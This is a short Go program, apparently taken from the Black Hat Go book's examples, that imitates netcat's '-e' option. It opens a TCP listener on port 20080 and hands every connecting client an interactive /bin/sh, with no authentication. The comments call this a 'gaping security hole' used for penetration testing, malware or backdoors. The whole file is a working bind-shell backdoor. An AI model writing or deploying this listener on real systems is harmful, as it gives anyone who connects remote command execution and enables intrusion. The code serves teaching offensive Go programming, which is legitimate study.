package main

import (
	"io"
	"log"
	"net"
	"os/exec" // use it for running OS commands
)

// This example mimic the behavior of Netcat, which is known as the
// TCP/IP Swiss Army knife. The command "$ nc -lp <port> -e /bin/bash"
// creates a listening server where a client can connect to and execute
// arbitrary bash commands which is also known as a "gaping security hole".
// The example allows a remote client to interact with the shell as if they
// were on a local machine which is a security risk but most often used for
// penetration testing, malware or backdoors to gain unauthorized access.
//
// Source: https://github.com/blackhat-go/bhg/blob/master/ch-2/netcat-exec/main.go

func handle(conn net.Conn) {
	// Creates the Shell process
	// TODO Windows: cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i") // -i: interactive shell

	// Sets up a pipe. io.Pipe() creates a reader and writer that is
	// synchronously connected. Any data written to the writer-pipe (wp) can be
	// read by the reader-pipe (rp).
	rp, wp := io.Pipe()

	// Redirects shell I/O by reading input from the TCP connection and writes
	// output to the pipe (wp).
	cmd.Stdin = conn
	cmd.Stdout = wp

	// Copies Shell output back to the connection. The goroutine prevents
	// blocking code.
	go io.Copy(conn, rp)

	// Runs the Shell.
	cmd.Run()

	conn.Close()
}

func main() {
	// Opens a listening server
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		// Handles a client which connects to this server
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
